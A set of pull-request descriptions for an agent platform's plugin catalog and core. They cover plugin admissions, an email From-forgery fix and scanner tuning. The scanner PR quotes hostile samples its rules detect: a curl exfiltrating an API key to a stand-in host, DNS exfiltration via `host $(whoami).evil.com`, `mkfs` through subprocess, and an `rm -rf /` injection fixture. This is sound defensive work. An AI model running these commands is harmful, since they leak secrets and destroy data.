Adds **agora** to the plugin catalog.

`repo: https://github.com/yzy806806/agora` (public, MIT) · `sha: 2f87b19c5d862201897aea6c0b212932ef3a4e49` (`v2.0.3`) · submitted by the repository owner.

## What it is

A self-driving multi-agent development team. Role-based workers (architect, developer, reviewer, tester, researcher, writer, devops) are each a **real Hermes profile** with its own SOUL.md and skills. They discuss and vote on decisions, and the adopted conclusion is executed by the same team. A `leader` profile chairs the discussions; a heartbeat cron wakes it to assess state, unblock workers and plan the next phase.

Discussion and execution share one board — deliberately no second storage system:

- A **motion** is a sub-task of a per-project *team channel* task (a persistent kanban task pinned in `scheduled` status, so the dispatcher never claims it).
- Speech and votes are `[agora:msg]` JSON **comments** on that task (same convention as upstream `[swarm:blackboard]`).
- The conclusion is written to `task.result`; an adopted conclusion becomes **execution tasks parented to the motion**, so context reaches workers through Hermes' own parent handoff rather than any leader transcription.
- Worker state is plain kanban status — the dispatcher schedules work exactly as it does for any other task.

Ships 20 tools, 3 kanban lifecycle hooks (`kanban_task_completed` / `_claimed` / `_blocked`), a dashboard tab + REST routes, and an `hermes agora` CLI.

## Admission checks

- **No self-updating code** — the plugin never fetches or replaces its own files, and does not read GitHub releases or shell out to `hermes plugins update`. Updates reach users only through a SHA-bump PR here.
- **No third-party dependencies** — no `pyproject.toml`, no `python_dependencies`; only stdlib plus packages Hermes already ships (`yaml`/`fastapi`/`pydantic`, imported lazily or under `try/except ImportError`). So there is no dependency-floor question to settle.
- **Capabilities match reality** — `provides_tools` lists all 20 registrations, `provides_hooks` all 3; `provides_middleware` and `requires_env` are empty (verified: the plugin registers no middleware and requires no environment variables of its own).
- **Security scan clean** — `hermes plugins validate` on a fresh clone at the pinned SHA: exit 0, 13/13 checks pass, `security scan — safe` with no `caution` findings.

## Disclosure — what the plugin reads and writes

- **Creates a Hermes profile per worker**, copying the global `config.yaml` into it and symlinking the global `.env` (so workers use the operator's model credentials).
- **Spawns `hermes -p <profile> chat` subprocesses** to speak in discussions and to run dispatched tasks. These run as full agents with that profile's toolset, meaning model calls under the operator's own provider credentials, and terminal/file writes **inside the configured project workdir** (which is how the team writes code).
- **Reads and writes the kanban database** — `tasks`, `task_comments`, `task_events`, `task_runs`, `task_links` — including the persistent team-channel task, and deletes a project's tasks when it is stopped or completes (deliberate clean-slate behaviour, documented in the README's *Stop & Cleanup*).
- **Registers one recurring cron job** and writes its runner script to `HERMES_HOME/scripts/leader_heartbeat.sh`.
- **Writes `AGENTS.md`** into the configured project workdir (regenerated on heartbeat, motion create/close and project updates).
- **Deploys three bundled skills** (`agora-setup`, `agora-awareness`, `agora-deliberation`) into `~/.hermes/skills/collaboration/`.
- **Serves a dashboard tab and REST routes** through the Hermes dashboard.
- **No network egress of its own** — all model traffic happens inside the spawned subprocesses under the operator's credentials. No telemetry, no author-hosted endpoints.

## Notes

- `requires_hermes: ">=0.20"` — 2.0 is developed and verified against v0.20.x (including the September 2026 module decomposition; `agora/kanban_compat.py` bridges both the old and new import layouts so a single build works on either).
- Dashboard UI is English-first; the repo README is bilingual (Chinese default, `README_EN.md` mirror), and `readme: true` renders it at the pinned SHA.
- Happy to adjust the `description`, `category`, or anything else in the entry — and to re-pin whenever a new release lands.

The email adapter no longer accepts unauthenticated `From:` addresses under open access. On main, anyone could forge a sender and land in that sender's conversation.

Salvages #123256 by @dborosev. The auth fix is kept with dborosev as author; the follow-ups narrow the logging.

## Problem

With `EMAIL_ALLOW_ALL_USERS=true`, or `GATEWAY_ALLOW_ALL_USERS=true` with no allowlist, `_sender_accepted` returned early through `_open_access()` and skipped the authenticated-`From:` check. Each conversation and every reply is keyed on `From:`. A forged `From:` therefore puts the attacker's text into that address's session, and the agent emails its answer to the victim.

## Changes

- `plugins/platforms/email/adapter.py`: removes the open-access bypass and `_open_access()`, which had no other callers. Open access still admits any sender, but mail now has to pass the same `Authentication-Results` check (DMARC, or aligned SPF/DKIM) as allowlisted mail.
- Drop logging, so operators see what they can fix and public inboxes aren't flooded:
  - A granted sender with no `Authentication-Results` header logs a WARNING naming the opt-out (`platforms.email.require_authenticated_sender: false` / `EMAIL_TRUST_FROM_HEADER=true`). The text is unchanged from main.
  - No stamp from the pinned `authserv_id` logs a WARNING pointing at `platforms.email.authserv_id` (`EMAIL_AUTHSERV_ID`).
  - A failing verdict from an address in `EMAIL_ALLOWED_USERS` / `GATEWAY_ALLOWED_USERS` logs a WARNING with the verdict and no opt-out hint (broken DKIM, a forwarder breaking alignment). Main gave the opt-out hint here, which is the wrong fix for a failing verdict.
  - Everything else, such as forged stranger mail under open access, logs at debug.
  - The two reason strings are module constants shared by the verifier and the gate.
- Tests: the open-access cases were folded into the existing `TestDispatchDefersToGatewayAuthorization` admit/drop tables, which use the real gateway auth check. One caplog test pins the four log cases. Three formatting tests that only passed through the bypass now set `sender_authenticated: True`.
- Docs: `website/docs/user-guide/messaging/email.md` describes the new behaviour and the log lines.

Left out of #123256: the message-id sidecar and the transport-metadata commit. Neither is needed for the auth fix, and the metadata commit takes the event timestamp from the sender-controlled `Date:` header, which needs a separate review.

## Behaviour change

A public inbox whose mail server doesn't add `Authentication-Results` now drops all mail until the operator sets `require_authenticated_sender: false` or `EMAIL_TRUST_FROM_HEADER=true`. Each drop logs a WARNING naming that setting.

## Verification

- `tests/gateway -k email`: 99 passed, 1 skipped. Also green with `EMAIL_TRUST_FROM_HEADER` or `EMAIL_AUTHSERV_ID` set in the environment.
- Against main's adapter, the new open-access drop cases and the log test fail.
- Mutations: each behaviour commit has a red test (removing the listed-sender warning, warning on open-access forgeries, dropping the authserv hint, restoring the bypass).
- Probe through the real parse → `_dispatch_message` path, 21 cases: forged `From:` under both open-access variables is dispatched on main and dropped here. `dmarc=pass`, `require_authenticated_sender: false` and `EMAIL_TRUST_FROM_HEADER` are dispatched on both.
- `ruff check` is clean on the changed files.

Not covered: failing mail from pairing-approved contacts still logs at debug. Telling them apart from open-access grants would need a pairing-store lookup.

items.body:
## What does this PR do?

Fixes the "first send after laptop sleep bounces once with *Chat out of date*" gap (#125532).

When the machine sleeps with a Desktop chat open, agent replies that complete during sleep leave the open transcript behind, and the first send after wake is refused once by the pre-send stale-transcript guard (#65047 — working as designed). The existing reconnect backstop (#94779) cannot cover this: a socket that zombie-survives sleep never transitions `gatewayState`, so it never fires; and even on a normal reconnect its refresh is async, so a quick submit can beat it.

The fix catches up on **return**: a `visibilitychange`→visible / `window focus` event with the window actively viewed (`windowIsActivelyViewed`, same semantics as the existing `visiblePoll` safety nets) triggers the existing signature-gated `requestActiveTranscriptRefresh(true)`. This covers both reported gaps — the zombie-socket edge (no state transition ever happens, but the user must focus the window to type) and the async-race edge (focus necessarily precedes the first keystroke). The downstream `reconcileActiveTranscript` is signature-gated, so an unchanged transcript costs one cheap tail read, exactly like the #94779 backstop.

A 5s floor (`TRANSCRIPT_RETURN_REFRESH_MIN_GAP_MS`) collapses the visibilitychange+focus pair of a single return and rapid cmd-tab switches into one read per return. Messaging transcripts are excluded — they keep their own visible poll (unchanged behavior, per the existing "Desktop sessions never enter this effect" contract).

## Related Issue

Fixes #125532

## Type of Change

- [x] 🐛 Bug fix (non-breaking change that fixes an issue)

## Changes Made

- `apps/desktop/src/app/contrib/hooks/use-background-sync.ts` — added a wake/return backstop effect after the #94779 reconnect backstop: on `visibilitychange`/`focus` with the window actively viewed and the gateway open (desktop session, not messaging), fire `requestActiveTranscriptRefresh(true)` at most once per `TRANSCRIPT_RETURN_REFRESH_MIN_GAP_MS`; exported that constant for tests.
- `apps/desktop/src/app/contrib/hooks/use-background-sync.test.ts` — three regression tests: one return (visibilitychange + focus) refreshes exactly once; repeats inside the 5s gap add no read while the next return after the gap refreshes again; a closed gateway does not refresh on return.

## How to Test

1. `cd apps/desktop && npx vitest run src/app/contrib/hooks/use-background-sync.test.ts` — Observed result: 49 passed (46 pre-existing + 3 new).
2. Pre-fix failure check: `git stash push -- apps/desktop/src/app/contrib/hooks/use-background-sync.ts`, re-run with `-t "#125532"` — Observed result: 2 failed / 1 passed (the two behavioral tests fail without the fix; the closed-gateway test is defensive and passes either way). Restored afterwards.
3. Regression sweep: `npx vitest run src/app/contrib/ src/store/transcript-sync.test.ts src/app/chat/` — Observed result: 1422 passed; the one suite-level failure (`sessions-pane-tab-title.test.tsx`, missing optional `@novnc/novnc` dep) fails identically on an unmodified checkout and is unrelated.

## Summary

Update the existing community catalog entry for **Secure ENV Ingress from 0.5.1 to 0.6.4**, following the previous catalog update in #122836. This PR changes **one catalog YAML file only**; it does not modify Hermes core or install/configure a consumer.

- Old pin: `8f42ca9a66a98a446c21e193605a8ee18d5ca417`
- New pin: `78737e35e68e2b2954083d773b3ee8bcf926e921`
- [Full plugin review range](https://github.com/web3blind/hermes-secure-env-plugin/compare/8f42ca9a66a98a446c21e193605a8ee18d5ca417...78737e35e68e2b2954083d773b3ee8bcf926e921)
- Add the actual new `secure_operation` tool to declared capabilities, retaining `browser_vault` and `pre_gateway_dispatch`.
- Expand the catalog disclosure to cover code-field filling and administrator-installed consumer execution, not just Vault writes.

## Changes since the last catalog submission

### ENV profile compatibility (0.6.4)
- Restore `/senv <profile> <FIELD,...>` when configured operation consumers are present. ENV setup no longer rejects the separate consumers section, preserves it unchanged and still rejects unknown ENV settings. Consumer loading/validation is unchanged.
- Regression test reproduces the failure and verifies consumer preservation and unknown-setting rejection. The original direct-field command was also confirmed working by the user after restart.

### HTTPS form accessibility
- Disable password-generation/autofill hints on one-use masked inputs (`autocomplete="off"`). Browsers may ignore this hint; it is not a security guarantee.
- Improve initial/result focus, accessible status messages, validation-error association, and field clearing.
- The ordinary form's Tab-navigation fix was confirmed by a user on Windows + Chrome + NVDA; automated Chromium coverage does not establish every assistive-device scenario.

### Browser Vault and one-time codes
- Optional authenticator setup key in the login form, validated with the native TOTP generator before saving into Hermes' native encrypted Vault. Invalid keys do not create an unusable login. Invalid authenticated submissions consume the one-use capability.
- Standalone `browser_vault` `mode: "code"`: enter an email/SMS/authenticator code without supplying a username/password or saving a login. The plugin fills the captured page through the supervisor CDP connection, without persisting the code to Vault or `.env` or returning it to the model.
- Code results distinguish `filled` from successful site verification; the plugin does not explicitly submit the site form, although a site may auto-submit on input.
- Support localized verification-field markup, with regressions for missing/ambiguous fields and page/origin changes.

### Generic ephemeral secret operations
- New `secure_operation` tool accepts only an operation identifier and nonsensitive parameters. A one-use HTTPS form shows the bound action summary before secret entry. The secret is passed in memory to the registered consumer; only fixed status metadata returns to the tool, not consumer return values or exception text.
- Administrator allowlist in `plugins.entries.secure-env-ingress.settings.consumers`: reviewed Python file path, factory name, and SHA-256. The programmatic registration API remains available. No consumers are shipped/enabled by default; tool arguments cannot register a consumer or specify an arbitrary executable/URL.
- Profile-scoped registration, checked source bytes/hash/ownership/permissions, duplicate-name rejection, captured execution context, replay prevention and bounded result waiting. Consumer execution does not hold the runtime lifecycle lock.
- 0.6.3 fixes premature `unknown` after a one-use link was consumed while its callback was still running. The original deadline remains enforced; cancellation/expiry of an already-running action reports uncertainty rather than claiming the action stopped.
- [Consumer configuration and trust contract at the pin](https://github.com/web3blind/hermes-secure-env-plugin/blob/78737e35e68e2b2954083d773b3ee8bcf926e921/secure_env_ingress/OPERATIONS.md).

## Security boundaries and admission disclosures

- **Browser Use is compatibility mode, not exact named-tab binding.** 0.6.0 temporarily refused it; 0.6.1 restored the existing task-supervisor/page/origin checks. The final pin cannot prove that the captured supervisor page is the most recent named `browser_exec` session/tab/CDP endpoint. Same-origin named sessions can be confused. This limitation is documented, not claimed fixed; users must verify the actual target.
- **Consumers are trusted code, not sandboxed.** Configured external Python executes with gateway privileges. Its imports are not pinned by the top-level source hash. Consumers must enforce target integrity, bounded execution, idempotency and secret handling. This is an explicit privileged extension boundary, not self-updating plugin code.
- **Bearer links are authorization, not proof of submitter identity.** Anyone possessing a link can submit it. Registrations requiring a verified principal currently fail closed instead of silently accepting bearer-only submission.
- Cancellation/deadline cannot forcibly terminate an in-process consumer. `unknown` requires external result verification before retrying; `completed` means the trusted synchronous callback returned, not independent verification of every possible external side effect.
- Existing disclosure retained: `/senv setup` supplies installation instructions involving `sudo`, host packages and TLS setup after approval; the listener binds all interfaces by default; `pre_gateway_dispatch` observes gateway messages to bind commands to senders.
- Admission scanner result: **caution**, not suppressed. Findings in the setup skill: `curl_pipe_shell` at line 35 and `sudo_usage` at lines 14, 16, 23, 32, 36, 38. These are setup instructions, not automatic execution on catalog load.
- No private configuration, credentials, account identifiers, operational artifacts or local filesystem paths are included in this PR. The plugin does not replace its own code outside the catalog pin.

## Verification

- 0.6.4 release: **420 tests passed, 0 failed**; Ruff, build and diff checks passed. Installed package and manifest versions matched 0.6.4, installed-wheel HTTPS discovery and configured-consumer checks passed. Catalog structural and plugin admission validation were rerun for this update and passed, with the same disclosed scanner cautions.
- The following records describe the earlier cumulative 0.6.3 verification, retained for context:

- Catalog structural validator: **passed** for the changed entry.
- `hermes plugins validate` against the plugin subdirectory at the exact clean pinned checkout: **passed**, including isolated registration, declared tool/hook parity and no built-in tool collisions; scanner cautions disclosed above.
- Plugin canonical test runner: **419 passed, 0 failed**, plus 3 pre-existing expected failures. After the 0.6.3 version update, the focused operation suite was rerun: **25 passed**.
- Chromium/CDP isolated HTTPS smokes cover Vault login/fill, standalone code fill and secret operations, including focus/clearing and replay/target-change refusal.
- Built/installed wheel checks cover discovery and configuration-driven external-consumer registration through dispatcher -> HTTPS -> fixture action. The slow-operation regression was also exercised against the installed 0.6.3 wheel and returned `completed` rather than premature `unknown`.
- Ruff, JS syntax, build and diff checks passed during release verification.
- Limits: the latest slow-operation fix has synthetic/installed-wheel regression coverage, but has not yet been confirmed by another real production operation after restart. No blanket claim of live-account or cross-device acceptance.

## Rollout

This is a cumulative catalog update, not a request to merge every intermediate release. Catalog users opt into the reviewed pin through `hermes plugins update secure-env-ingress`; activating updated process-loaded code requires the appropriate plugin reload/restart. External consumers require separate administrator configuration and review.

## What does this PR do?

Add owner-maintained Vault View to the Desktop catalog, pinned to the published [v0.4.8 release](https://github.com/ergocogn/hermes-desktop-plugin-vault-view/releases/tag/v0.4.8), commit `532c9b95f204cafb224e33c8075c4a774ad6f7eb`. Vault View provides visual Markdown editing, progressive reading, cached local image previews, shared tabs, tag search, links and a graph. This PR changes one catalog file only; no Hermes runtime changes.

## Catalog review corrections

- SDK SandboxedFrame replaces the raw webview; plugin and catalog require Hermes >=0.21.5.
- Agent navigation guidance has an independent localized opt-in, off by default. Opt-out removes stale plugin guidance while preserving user attachments and note source.
- Remote note images are blocked by default and require a separate persistent opt-in. Opt-out removes existing remote sources while preserving Markdown.
- Runtime controls, errors, prompts, confirmations, bridge messages, code-copy, callout, link, image and agent-context text use English/French locale bundles.
- `platforms: [linux, macos]`. Windows Desktop requires a WSL-hosted Unix backend; native Windows gateways are unsupported.
- Removed the document.body observer and all transcript DOM rewriting; the composer reference no longer emits `<ide_opened_file>`. The workspace anchor uses the public SDK and the plugin’s own previous tab only. Image preference updates are scoped to the plugin root.

The release includes metadata-only plugin.yaml and byte-identical root/desktop entry points. The root file remains for direct installation as documented by the SDK; desktop/plugin.js is the catalog entry. There is no Python module or Agent runtime capability. Banner and synthetic screenshots are pinned to the same public commit. Related to #107262.

## Validation

Plugin regression, package parity, catalog policy, Playwright editor/image/navigation/privacy and synthetic WSL gateway suites passed. The browser suite checks remote-image requests before opt-in and Markdown preservation. The official Desktop surface lint and catalog validator accepted the reviewed source and entry at Hermes commit `8b66a51036c1e20920a17cdd049fdf55c968d683`. The installed Hermes plugin validator passed; its Python capability probe was skipped as expected for a Desktop-only plugin. The running Hermes Desktop UI showed v0.4.8 and restored a Vault View note tab after hide/show.

Full Hermes tests, clean install, restart, native external-application launches and cross-platform UI checks were not run. Direct Obsidian opening stays hidden; ffmpeg thumbnails are optional. Some websites reject SDK iframe embedding; external opening remains available. No note bodies are shared automatically.

## Disclosure

I maintain the plugin through ergoCogn. Prepared with AI assistance; automated checks and manual limitations are distinguished in the public documentation. Only public source, synthetic examples and public contribution guidance are included.

## plugin-catalog: bump memex8 to v1.1.0

Bumps the pinned SHA from `b5e87b7b` (v1.0.0) to `47fbe5b8` (v1.1.0) so users running `hermes plugins install memex8` get the six new features in the v1.1.0 release.

### Six new features (all default-off)

| # | Feature | What it does |
|---|---|---|
| 1 | Per-session injection dedup | Stops re-injecting the same memory across turns; char-budget gate drops low-priority memories |
| 2 | Decision/evaluation promotion | Promotes turns with `decided`, `shipped`, `learned`, etc. to slower-decay memory types |
| 3 | Prompt-injection sanitization | Neutralizes `{{template}}`, `${template}`, unbalanced triple-backticks, `javascript:`/`vbscript:`/`data:text/html` URLs on read |
| 4 | Configurable system-prompt template | User can override the default preamble with `{{version}}`, `{{tool_*}}`, `{{base_url}}` substitutions |
| 5 | Export/import memories as JSON | Round-trip the whole store through `GET /api/v1/memories` for backup/migration |
| 6 | `/memex8` slash command | `stats`, `status`, `search`, `recall`, `remember`, `forget`, `export`, `import`, `realms`, `help` |

### Why the SHA bump is a "minor" version, not "patch"

Six new behaviors, six new config keys (`dedup_injected_memories`, `recall_max_inject_chars`, `promote_decisions`, `promote_evaluations`, `sanitize_for_prompt`, `enable_export_import`, `system_prompt_template`), and a new slash command. All default-off — existing users on v1.0.0 see zero behavior change until they opt in.

### Spec changes

- `sha`: `b5e87b7b9a537ec663dd0c5d68a5ebf819976abc` → `47fbe5b8813e712c8f0a52c6d4e5ab37e09498f5`
- `version`: `1.0.0` → `1.1.0`
- `image`: pinned to new SHA so catalog preview renders
- `description`: extended with the six-feature summary (preserves the existing disclosure sentence)
- `provides_hooks`: restored to `[on_session_end, on_pre_compress]` (was `[]` in the prior entry — both hooks are still implemented and surfaced in `plugin.yaml`)

### Reference

- Plan: https://github.com/Ex8-ca/memex8/blob/main/PLAN-memex8-v1.1-features.md
- Plugin repo: https://github.com/Ex8-ca/memex8
- Prior catalog PR: #125315 (merged)

Closes: bumping the v1.0.0 catalog entry added by #125315.

Bumps the pinned sha to the published v0.2.2 release, so the entry no longer
serves 0.2.1 to anyone installing it.

0.2.2 is an audit/observability fix, verified at the pinned sha:

- Replayed audit records re-emit the two measured confidences instead of a
  collapsed copy. The per-turn memo stored `max(model_confidence,
  effort_confidence)` and the replay path recopied that value into *both*
  confidence fields, so a fresh 0.34/0.65 decision re-reported as 0.65/0.65 —
  an effort confidence presented as a model confidence Jev never gave. Routing
  and replay behaviour are unchanged (grid_coverage already filtered replays).
- Replayed records report unmeasured fields (effort_choice,
  model_probabilities, effort_probabilities, alternatives) as `null`, never as
  a copied value, so an aggregate over the audit tail can tell "not measured"
  from "measured as empty". Adds 3 regression tests.

Gate 1 — `scripts/validate_plugin_catalog.py plugin-catalog/` -> OK: 338 file(s) valid

## Summary

Four scanner false-positive classes surfaced by today's plugin-catalog intake lanes, fixed in one PR per the install-scanner-tuning contract: **demote, never drop** — every legit sample stays in the report at a confirmable/informational severity, and the same text at a command position keeps its severity. One of them (`format_filesystem` on a guard plugin's own denylist) was **install-blocking**: an un-overridable `dangerous` on a plugin whose whole job is to refuse that command.

`PLUGIN_SCANNER_VERSION` → `plugin-guard-v9` so cached verdicts re-scan.

| pattern | legit sample that was flagged | why safe | malicious sample still caught |
|---|---|---|---|
| `format_filesystem` (critical → **dangerous**) | perseus-vault `authority.py:44`: `re.compile(r"\b(?:rm\|rmdir\|shred\|mkfs\|dd\|…)\b", re.I)` | the word is an **alternation member inside a regex literal** — the plugin's own destructive-command denylist. Joins the existing `is_regex_alternation_token` contract (`sudo`, `env\|`) → **high** (caution, confirmable); a whole-literal `"mkfs"` list entry qualifies only on a line with no exec call | `subprocess.run("mkfs.ext4 /dev/sda1", shell=True)`, `os.system('mkfs /dev/sda')`, `CMD = "yes \| mkfs -t ext4 /dev/sdb"` → all **critical / dangerous** |
| `env_exfil_curl` / `env_exfil_wget` (critical; high in README) | memex8 `README.md:166`: `curl -H "Authorization: Bearer $MEMEX8_API_KEY" \` ⏎ `http://localhost:8080/health` | the pattern already exempts a **same-line** loopback target; here the URL sits on the `\` continuation line so the regex never saw it. New `logical_line()` joins `\`-continuations; the finding drops to **low** only when the pattern stops matching on the joined line **and every `http(s)://` host on it is `localhost` / `127.0.0.1` / `[::1]`** (same set as the pattern's own exemption) | `curl -H "Bearer $API_KEY" \` ⏎ `https://collect.example/ingest` → README **high**, `after-install.md` **critical / dangerous**; loopback **beside** a routable host on the continuation line → unchanged too |
| `deception_hide` (high, injection — no prose cap in `skills/*/SKILL.md`) | hermes-tenuo `skills/tenuo-scope/SKILL.md:24`: `Do the work. Do not tell the user to "be careful with `terminal`."` | a tone rule that **quotes the phrase** the agent should not say. Extends the pattern's existing UX-guidance lookahead (`unless/except/until/confirm/…`) with `(?!\s+to\s+["'“‘])` — only `the user to "…"` / `to “…”` is exempt | `Do not tell the user about the upload.`, `…that you copied the key.`, `…what this skill sends.`, and the **unquoted** `Do not tell the user to look at ~/.hermes/logs; delete them first.` → all **high / caution** |
| `hex_encoded_string` (medium) | hermes-routines `desktop/plugin.js:160` / `cronShapes.ts:31`: `/[\x00-\x1F\x7F]/`; ANSI filters `[\x1b\x9b\x07][[\]()#;?]*…` | every `\xHH` sits **inside a `[...]` character class** — bytes being matched/stripped, never assembled into a string → **low** | `eval("\x63\x75\x72\x6c \x68\x74\x74\x70")` → **medium**; a class **plus** one `\xHH` outside it (`"\x63\x75" + re.sub(r"[\x00-\x1F]", "", "\x72\x6c")`) → **medium** |

Also surfaced by the lanes but **not changed here** (already at the contract): test-fixture secrets and `/etc/passwd` probes under `tests/` are medium/low notes on main (hermes-tenuo `tests/test_audit.py`, openltm `test_secrets_scrubber.py`); the one remaining `high` (`tests/test_cli.py:237`, `call("read_file", {"path": "/etc/passwd"})`) is executable test code and stays a confirmable `high` by design. `unpinned_pip_install` / `dump_all_env` on README prose are medium (verdict-neutral) and left alone.

## Before / after on the real pins (frozen at the intake shas)

| pin | main (`plugin-guard-v8`) | this branch (`v9`) |
|---|---|---|
| Perseus-Computing-LLC/hermes-plugin-perseus-vault @ c6e6932 | **dangerous** (`format_filesystem` critical, authority.py:44) — could not be installed even with `--force` | **caution** (same finding, high) |
| Ex8-ca/memex8 `plugins/memex8` @ b5e87b7 | caution (`env_exfil_curl` high, README.md:166) | **safe** (same finding, low) |
| tenuo-ai/hermes-tenuo @ 80a980b | caution (34 findings; `deception_hide` high on SKILL.md:24) | caution (33 findings; `deception_hide` gone — the remaining high is the executable `/etc/passwd` test line) |
| raitoxlol/hermes-slash-router @ 0bcfa96 / crdesign8/hermes-routines @ aa055f5 | safe (`hex_encoded_string` medium) | safe (low) |

## A/B against `origin/main` (skill recipe)

- **In-tree sweep** (`skills/`, `optional-skills/`, `plugins/` — 320 entries): **0 worse**, 0 verdict changes; 3 findings moved medium→low, all `hex_encoded_string` on real control-char/quote classes (`plugins/memory/query_rewrite.py:76`, `plugins/platforms/matrix/adapter.py:275`, `plugins/security-guidance/patterns.py:181,199`).
- **Attack probes** (`attack_probes.py`, 23 executable/agent-facing shapes): output **byte-identical** between main and this branch.
- Catalog blast-radius sweep over the real pins: see the comment below (running at PR-open time).

## Tests

`tests/tools/test_plugin_guard.py::TestIntakeFalsePositiveRound2` — per class one "benign shape steps down" test and one "attack shape keeps severity" test (parametrised), each written red on `origin/main` first. `tests/tools/test_plugin_guard.py`, `test_plugin_guard_block_reason.py`, `test_skills_guard.py`, `test_memory_tool.py`, `test_cronjob_tools.py`: 242 passed (the 7 `TestInstallIntegration` errors are a local `uv sync` Python-3.11-vs-3.14 venv mismatch present on main too, not this change). `ruff check` clean.

Second commit `e39c527`: the catalog sweep showed the bracket lexer reading `[Frame(b"\x01\x00" * 200), …]` (a Python list) as a class — quote characters are now excluded from the class body; see the sweep comment.

Files: `tools/plugin_guard.py` (wire-up + version), `tools/plugin_guard_context.py` (`format_filesystem` alternation token, `is_hex_in_char_class`, `logical_line` + `is_loopback_continuation`), `tools/skills_guard.py` (`deception_hide` lookahead), `tests/tools/test_plugin_guard.py`.



## Round 3 — 2026-10-01 catalog sweep (commit `e530584`, rebased onto `origin/main`)

Seven more FP mechanisms from the 2026-10-01 sweep. Each is fixed in the pattern itself or in a narrow context rule, with no path exclusions. Every one was shown red on `origin/main` against the real pinned tree that tripped it. `SCANNER_VERSION` → `skills-guard-v8`, because the shared regex table changed.

| pattern | flagged on (pin) | fix | before → after |
|---|---|---|---|
| `crypto_mining` | oh-my-hermes `omh/tools/skill_shortlist.json:2021,2029` (keyword index: `… monero multimodal … xmr`), plus the same `"monero gateway"` keyword in `.py`/`SKILL.md` | the bare coin name `monero`, with no miner binary / pool / algorithm / mining verb on the line, is capped at **medium**. `xmrig`, `stratum`, `coinhive`, `cryptonight`, or `monero` next to a pool or "miner" keep full severity | critical → medium; the omh catalog subdir goes **dangerous → safe** |
| `dns_exfil` | hermes-tailscale `plugin.js:381/417` (`connected host (${connectionId})`), hermes-browser `src/host-bridge.js:25` (`` `host ${resp.status}: …` ``), nginx `Host $host;` | `host` now needs the exfil shape: an interpolation inside a domain (`host $(whoami).evil.com`) or a shell command position (`; host $x`, `do host $c`). `dig`/`nslookup` are unchanged | high/critical → no finding |
| `echo_pipe_exec` (+ `curl_pipe_shell`, `wget_pipe_shell`) | rtk-rewrite-docker `README.md:81`, `.github/workflows/ci.yml:43`, ntfy-approval `tests.yml:45` (`… \| sha256sum -c -`) | the shared shell alternation is now word-bounded, so `\| sha256sum` no longer matches as `\| sh` | high → no finding |
| `sudo_usage` | hermes-zh `tips_zh.json:1137,1138,2133,2515` (translation pairs + tips list) | a **high** finding mid-sentence inside a `"key": "string"` pair or a bare string list element of a `.json` data file takes the README prose cap. Kept at full severity: command keys (`command`, `run`, `args`, `postinstall`…), a string that **starts** with the command (`"sudo",` in an args array), `package.json`, and critical findings | high → medium; hermes-zh **caution → safe** |
| `exec_string` | hermes-notch `plugins/hermes-monitor.js:762,763,770,772` (`db.exec('PRAGMA …')`), OpenLtm/inline SQLite calls | negative lookahead for an upper-case SQL statement (`PRAGMA`/`BEGIN`/`COMMIT`/`ROLLBACK`/`CREATE`/`INSERT`…) | high → no finding |
| `destructive_root_rm` / `system_passwd_access` in tests | hermes-beads `tests/test_security.py:64,76` (`'; rm -rf / ; $(whoami) `id`'`, `"../../../etc/passwd"`) | in Python/JS/TS, a `$(…)` or backtick **inside** a string literal no longer counts as "this line executes". `os.system(`/`exec(` outside the literal still count, and shell files keep the raw line | high → medium (quoted fixture note); beads **caution → safe** |
| `destructive_home_rm` in docs | tool-slimmer `docs/dashboard-plugin.md:85` (`rm -rf ~/.hermes/plugins/tool-slimmer` before a reinstall `cp`) | the self-uninstall note now accepts the `~/` and `${HOME}/` forms, not just `$HOME/`. Wider targets, and the same line in a `.sh`, keep severity | high → medium; tool-slimmer **caution → safe** |
| `curl_pipe_shell` in a Python hint string | little-canary `demo.py:458` | **not changed, on purpose.** The same literal assigned to a variable (`CMD = "curl … \| sh"`) is the attack shape, and today it only scores high (caution, confirmable) | caution (unchanged) |
| `format_filesystem` | perseus-vault `authority.py:44` | round 1 above (own-denylist alternation token) | dangerous → caution |

hermes-rss and rich-ui had no `src/host-bridge.js` at their pinned SHAs. hermes-rss's remaining hit is a real `` `dig +short A ${name}` `` invocation and stays flagged on purpose.

### Before/after: every tree in the frozen sweep pins (200 trees = 154 pins + catalog subdirs)

| | safe | caution | dangerous |
|---|---|---|---|
| `origin/main` | 156 | 30 | 14 |
| this branch | **167** | **21** | **12** |

- **0 verdicts worse, 0 new findings.** 12 verdicts improved. 112 findings disappeared, and every one belongs to a mechanism in the table: `exec_string` on an upper-case SQL statement (OpenLtm, inline, hermes-notch, hindsight test), `dns_exfil` on `host` used as a noun or header (tailscale, hermes-browser, inline `matrix.host` / `non-local host '${hostname}'`, hindsight nginx `Host $host` in conf/README/docs), and `echo_pipe_exec` on `| sha256sum` (rtk, ntfy-approval, deja-vu `release.yml:161`). 45 severity changes: 20 from rounds 1–2 (`hex_encoded_string`, memex8 loopback curl) and 25 from round 3 (`monero` keyword → medium, tips JSON, beads/omh quoted test fixtures, tool-slimmer docs).
- Round-3-only diff (rebased PR head → this commit): 0 worse, 0 new, 9 trees improved, 112 findings gone (all listed above), 25 severity changes.
- **Attack probes** (`attack_probes.py`, 23 shapes): output byte-identical to `origin/main`. A further 34 targeted probes (host/dig/nslookup exfil incl. nested `$( )` and `do host $c`, `echo … | sh`/`|sh`, `curl | zsh`, Python `exec("import os")`, JS `child_process.exec(…)`, `monero` + pool/miner, JSON command keys / args arrays / value-start commands / `package.json`, executing test lines, wide doc `rm`, own-dir `rm` in `.sh`, `mkfs` at a command position) all keep their `origin/main` verdict. `TestIntakeFalsePositiveRound3` adds 2 parametrized invariants: 11 inert shapes no longer prompt, and 12 attack shapes keep their severity. ## What does this PR do?

Adds a catalog entry for `tam`, a memory provider backed by
[total-agent-memory (TAM)](https://github.com/vbcherepanov/total-agent-memory). I maintain both TAM
and the plugin repo, https://github.com/vbcherepanov/hermes-tam-memory. The plugin lives in the
`hermes_tam_memory/` subdirectory, pinned at `0adc0b966971df6be5118e8d64e450c80bb7abf3`.

What the provider does:
- `sync_turn`: saves the user message and final reply of each turn to TAM, on a background writer
  with a bounded retry queue. Trivial prompts, very short turns and injected `<memory-context>`
  blocks are filtered first. TAM's quality gate, when enabled, can still reject a record. No tool
  calls or tool output are sent. Subagent, cron and flush contexts do not auto-save.
- `prefetch`: recalls from TAM within a token budget, stays under the 8 s external prefetch
  deadline, and skips the current session's own turns.
- Tools `tam_recall` and `tam_save`; mirrors built-in memory `add` writes; `post_setup` for
  `hermes memory setup tam` with a live connection check; `get_status_config` for
  `hermes memory status`.
- Local mode starts the separately installed `tam` binary over MCP stdio, with a reduced child
